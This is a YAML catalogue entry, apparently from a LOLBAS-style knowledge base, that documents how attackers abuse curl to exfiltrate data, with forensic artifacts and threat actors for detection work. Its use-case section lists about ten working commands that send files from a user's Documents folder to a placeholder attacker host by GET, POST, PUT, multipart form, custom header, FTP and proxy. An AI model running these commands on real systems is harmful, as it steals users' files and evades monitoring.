Name: curl
Aliases:
  - cURL
  - libcurl
  - curl.exe
Description: >
  curl is a native command-line utility for transferring data using multiple protocols like HTTP, HTTPS, and FTP.
  It is included by default in modern Windows, macOS, and Unix/Linux systems. curl is often abused by threat actors
  to exfiltrate data via HTTP(S) POST requests, file uploads using PUT, FTP transfers, custom headers, or multipart forms.
  Its presence by default on most systems, combined with flexible options, makes it ideal for stealthy exfiltration.

Category: native
Platform:
  - Windows
  - Linux
  - macOS
Execution:
  - cli
Capabilities:
  - HTTP-request
  - HTTPS-request
  - FTP-upload
  - file-upload
  - header-manipulation
  - proxy-aware
Stealth:
  - native-binary
  - user-agent-manipulation
  - silent-execution
  - background-execution
  - header-manipulation
  - proxy-support
  - encrypted-transfer
Forensics:
  BinaryLocations:
    - /usr/bin/curl
    - C:\Windows\System32\curl.exe
  CommandLineArgs:
    - --data
    - --data-binary
    - --upload-file
    - --request
    - --header
    - --form
    - --proxy
  NetworkArtifacts:
    - HTTP/HTTPS traffic with custom headers
    - DNS queries to external servers
    - PUT/POST uploads with file data
    - FTP control and data connections
  ConfigFiles:
    - ~/.curlrc
    - C:\Users\<user>\.curlrc
  ScheduledTask: []
ThreatActors:
  - LockBit
  - BlackBasta
  - FIN7
  - APT-C-36
References:
  - https://unit42.paloaltonetworks.com/vice-society-ransomware-powershell/
  - https://attack.mitre.org/software/S0660/
  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1041/T1041.md
Tags:
  - cli
  - native
  - http
  - https
  - ftp
  - file-upload
  - encrypted-transfer
  - proxy-aware
  - user-agent-manipulation
  - lolbas
UseCases:
  - Title: URL-encoded GET request
    Description: Read file content, URL-encode it, and send via GET parameter.
    Command: |
      $data = Get-Content "$env:USERPROFILE\Documents\data.csv" | Out-String
      $encoded = [uri]::EscapeDataString($data)
      Invoke-Expression "curl http://<ip>:8080/exfil?curl_urlencoded=$encoded"

  - Title: Base64-encoded GET request
    Description: Base64 encode file content and send via GET parameter.
    Command: |
      $data = Get-Content "$env:USERPROFILE\Documents\data.csv" | Out-String
      $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data))
      Invoke-Expression "curl http://<ip>:8080/exfil?curl_base64=$b64"

  - Title: HTTP POST with --data-binary
    Description: Exfil file content in POST body.
    Command: curl -X POST http://<ip>:8080/upload --data-binary "@C:\Users\Admin\Documents\data.csv"

  - Title: HTTP PUT with --data-binary
    Description: Exfil file via PUT upload.
    Command: curl -X PUT http://<ip>:8080/upload --data-binary "@C:\Users\Admin\Documents\data.csv"

  - Title: File upload using -T (PUT)
    Description: Upload a large file using PUT.
    Command: |
      curl.exe -T "C:\Users\Admin\Documents\file.zip" http://<ip>:8080/out.zip

  - Title: Upload multiple files in a loop
    Description: Loop through CSV files in a directory and upload each file individually.
    Command: |
      $files = Get-ChildItem "C:\Users\Admin\Documents" -Filter *.csv
      foreach ($file in $files) {
        curl.exe -T $file.FullName http://<ip>:8080/$($file.Name)
        Start-Sleep -Seconds 1
      }

  - Title: Multipart form upload
    Description: Simulate browser upload using multipart form data.
    Command: |
      curl.exe -X POST -F "file=@C:\Users\Admin\Documents\secret.zip" http://<ip>:8080/upload

  - Title: Custom header exfiltration
    Description: Inject data as a custom HTTP header.
    Command: |
      curl.exe -H "X-Data: $(Get-Content -Raw C:\Users\Admin\Documents\data.csv)" http://<ip>:8080/header

  - Title: FTP upload using --upload-file
    Description: Upload a file using FTP with embedded credentials.
    Command: |
      curl.exe --upload-file "C:\Users\Admin\Documents\data.csv" ftp://ftpuser:pass@<ip>/data.csv

  - Title: Upload via proxy
    Description: Use proxy to exfiltrate file and evade detection.
    Command: |
      curl.exe -x http://127.0.0.1:8080 -T "C:\Users\Admin\Documents\data.csv" http://<ip>:8080/data.csv

